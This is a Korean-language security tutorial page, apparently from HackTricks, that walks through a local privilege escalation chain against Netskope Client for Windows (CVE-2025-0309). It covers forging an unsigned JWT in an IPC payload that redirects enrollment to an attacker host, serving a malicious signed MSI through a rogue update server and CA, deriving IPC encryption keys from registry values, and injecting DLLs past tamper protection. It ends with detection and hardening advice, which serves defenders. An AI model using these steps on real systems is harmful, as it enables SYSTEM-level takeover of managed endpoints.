# 엔터프라이즈 자동 업데이트 및 권한 있는 IPC 악용 (예: Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

이 페이지는 낮은 마찰의 IPC 표면과 권한 있는 업데이트 흐름을 노출하는 엔터프라이즈 엔드포인트 에이전트와 업데이터에서 발견되는 Windows 로컬 권한 상승 체인의 한 범주를 일반화합니다. 대표적인 예는 Netskope Client for Windows < R129 (CVE-2025-0309)로, 권한이 낮은 사용자가 공격자가 제어하는 서버로 등록을 강제한 뒤 SYSTEM 서비스가 설치하는 악성 MSI를 전달할 수 있습니다.

다음은 유사 제품에 재사용 가능한 핵심 아이디어입니다:
- 권한 있는 서비스의 localhost IPC를 악용해 재등록 또는 재구성을 공격자 서버로 강제합니다.
- 공급업체의 업데이트 엔드포인트를 구현하고, 악성 Trusted Root CA를 배포한 다음 업데이트 프로그램을 악의적 “서명된” 패키지로 가리킵니다.
- 약한 서명자 검사(CN allow‑lists), 선택적 다이제스트 플래그, 느슨한 MSI 속성을 회피합니다.
- IPC가 “encrypted” 되어 있다면 레지스트리에 저장된 전역 읽기 가능한 머신 식별자에서 key/IV를 유도합니다.
- 서비스가 이미지 경로/프로세스 이름으로 호출자를 제한하면 허용 목록에 있는 프로세스에 인젝션하거나 하나를 suspended 상태로 생성한 뒤 최소한의 스레드 컨텍스트 패치로 DLL을 부트스트랩합니다.

---
## 1) localhost IPC를 통해 공격자 서버로 등록을 강제하기

많은 에이전트는 JSON을 사용해 localhost TCP를 통해 SYSTEM 서비스와 통신하는 user‑mode UI 프로세스를 제공합니다.

Netskope에서 관찰된 구성:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

익스플로잇 흐름:
1) 백엔드 호스트(예: AddonUrl)를 제어하는 클레임을 포함한 JWT enrollment 토큰을 생성합니다. alg=None을 사용하면 서명이 필요 없습니다.
2) JWT와 테넌트 이름을 포함해 프로비저닝 명령을 호출하는 IPC 메시지를 전송합니다:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) 서비스가 enrollment/config를 위해 악성 서버를 호출하기 시작합니다. 예:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- 호출자 검증이 경로/이름 기반이라면, 허용 목록에 등록된 vendor binary에서 요청을 발생시키세요 (§4 참조).

---
## 2) 업데이트 채널을 탈취하여 SYSTEM 권한으로 코드 실행

클라이언트가 서버와 통신하면, 예상되는 endpoints를 구현하고 클라이언트를 악성 MSI로 유도하세요. 일반적인 순서:

1) /v2/config/org/clientconfig → JSON config를 아주 짧은 업데이트 간격으로 반환, 예:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA 인증서를 반환합니다. 서비스는 이를 Local Machine Trusted Root store에 설치합니다.
3) /v2/checkupdate → 악의적인 MSI와 가짜 버전을 가리키는 메타데이터를 제공합니다.

Bypassing common checks seen in the wild:
- Signer CN allow‑list: 서비스는 Subject CN이 “netSkope Inc” 또는 “Netskope, Inc.”인지 만 확인할 수 있습니다. Your rogue CA는 해당 CN을 가진 leaf를 발급하고 MSI에 서명할 수 있습니다.
- CERT_DIGEST property: CERT_DIGEST라는 이름의 무해한 MSI 속성을 포함합니다. 설치 시 강제되지 않습니다.
- Optional digest enforcement: config 플래그(e.g., check_msi_digest=false)가 추가 암호학적 검증을 비활성화합니다.

Result: SYSTEM 서비스는 C:\ProgramData\Netskope\stAgent\data\*.msi에서 당신의 MSI를 설치하여 NT AUTHORITY\SYSTEM으로서 임의 코드를 실행합니다.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope는 IPC JSON을 Base64처럼 보이는 encryptData 필드로 래핑했습니다. 리버싱 결과 AES가 레지스트리 값에서 유도된 key/IV로 동작하는 것이 드러났고, 해당 값들은 모든 사용자가 읽을 수 있습니다:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

공격자는 암호화를 재현하여 일반 사용자 계정에서 유효한 암호화된 명령을 보낼 수 있습니다. 일반 팁: 에이전트가 갑자기 IPC를 “암호화”하기 시작하면, HKLM 아래의 device ID, product GUID, install ID 같은 값을 찾아보세요.

---
## 4) Bypassing IPC caller allow‑lists (path/name checks)

일부 서비스는 TCP 연결의 PID를 확인하고 이미지 경로/이름을 Program Files 아래의 허용된 벤더 바이너리(예: stagentui.exe, bwansvc.exe, epdlp.exe)와 비교하여 피어를 인증하려 합니다.

실용적인 우회 방법 두 가지:
- DLL injection으로 허용된 프로세스(e.g., nsdiag.exe)에 주입하고 그 내부에서 IPC를 프록시합니다.
- 허용된 바이너리를 suspended 상태로 생성한 뒤 CreateRemoteThread를 사용하지 않고 proxy DLL을 부트스트랩하여 드라이버가 강제하는 변조 규칙을 충족시킵니다(see §5).

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

제품들은 종종 minifilter/OB callbacks 드라이버(e.g., Stadrv)를 번들로 제공하여 보호 대상 프로세스에 대한 위험 권한을 제거합니다:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME 제거
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE로 제한

이 제약을 준수하는 신뢰할 수 있는 유저모드 로더:
1) CreateProcess로 벤더 바이너리를 CREATE_SUSPENDED로 실행합니다.
2) 여전히 얻을 수 있는 핸들을 확보합니다: 프로세스에 대해 PROCESS_VM_WRITE | PROCESS_VM_OPERATION, 스레드에 대해 THREAD_GET_CONTEXT/THREAD_SET_CONTEXT(또는 알려진 RIP에서 코드를 패치할 경우 THREAD_RESUME만).
3) ntdll!NtContinue(또는 일찍 매핑되어 있는 다른 thunk)를 작은 스텁으로 덮어쓰고, 그 스텁에서 LoadLibraryW로 당신의 DLL 경로를 호출한 뒤 원래로 점프하도록 만듭니다.
4) ResumeThread로 스텁을 트리거하여 프로세스 내에서 DLL을 로드합니다.

이미 보호된 프로세스에 대해 PROCESS_CREATE_THREAD나 PROCESS_SUSPEND_RESUME를 사용하지 않았고(당신이 프로세스를 생성했기 때문에) 드라이버 정책을 만족시킵니다.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) — rogue CA 자동화, 악성 MSI 서명, 그리고 /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate 같은 필요한 엔드포인트 제공을 자동화합니다.
- UpSkope — 임의의(선택적으로 AES로 암호화된) IPC 메시지를 생성하고 허용된 바이너리에서 기원하도록 suspended‑process 주입을 포함한 커스텀 IPC 클라이언트입니다.

---
## 7) Detection opportunities (blue team)
- Local Machine Trusted Root에 대한 추가를 모니터링하세요. Sysmon + registry‑mod 이벤트(see SpecterOps guidance)가 효과적입니다.
- 에이전트 서비스가 C:\ProgramData\<vendor>\<agent>\data\*.msi 같은 경로에서 시작한 MSI 실행을 플래그합니다.
- 에이전트 로그를 검토하여 예상치 못한 enrollment 호스트/테넌트(예: C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – addonUrl / tenant 이상 및 provisioning msg 148)를 확인합니다.
- 예상된 서명된 바이너리가 아니거나 비정상적인 자식 프로세스 트리에서 시작된 localhost IPC 클라이언트에 대해 경보를 설정합니다.

---
## Hardening tips for vendors
- enrollment/update 호스트를 엄격한 allow‑list에 바인딩하고 clientcode에서 신뢰되지 않은 도메인을 거부하세요.
- IPC 피어 인증에는 이미지 경로/이름 확인 대신 OS 프리미티브(ALPC security, named‑pipe SIDs)를 사용하세요.
- 비밀 재료를 world‑readable한 HKLM에 두지 마세요; IPC를 암호화해야 한다면 보호된 비밀에서 키를 유도하거나 인증된 채널에서 협상하세요.
- updater를 서플라이체인 표면으로 취급하세요: 신뢰하는 CA로의 전체 체인을 요구하고, 패키지 서명을 고정된 키로 검증하며, 구성에서 검증이 비활성화된 경우 fail closed하세요.

## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
